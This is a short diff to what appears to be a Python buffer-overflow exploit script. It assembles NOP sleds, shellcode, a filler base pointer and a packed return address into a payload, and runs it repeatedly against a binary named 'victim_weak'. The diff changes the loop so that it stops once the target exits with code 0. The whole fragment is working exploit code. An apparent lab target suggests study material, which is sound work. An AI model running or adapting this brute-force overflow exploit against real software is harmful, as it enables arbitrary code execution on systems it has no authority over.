@@ -18,9 +18,12 @@ nopsled2 = b'\x90'*8
 rbp = b'\x90'*8
 rip = struct.pack("<Q", start)
 payload = nopsled1+sc+nopsled2+rbp+rip
-while True:
+
+returnvalue=-1
+
+while returnvalue!=0:
     try:
-        subprocess.call(['./victim_weak', payload[:-2]])
+        returnvalue = subprocess.call(['./victim_weak', payload[:-2]])
     except:
         pass
     print("Trying " + str(rip))
